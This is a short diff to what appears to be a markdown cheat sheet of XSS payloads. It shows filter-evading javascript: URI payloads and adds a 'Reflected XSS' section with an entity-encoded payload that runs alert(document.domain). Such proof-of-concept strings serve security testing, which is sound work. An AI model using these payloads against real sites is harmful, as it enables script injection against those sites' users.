@@ -153,3 +153,7 @@ can also work with single quotes (change it in the payload)
 javascript://%0dalert()
 javascript:/**/%0aalert()
 ```
+## Reflected XSS
+```js
+url=%26%2302java%26%23115cript:alert(document.domain)
+```
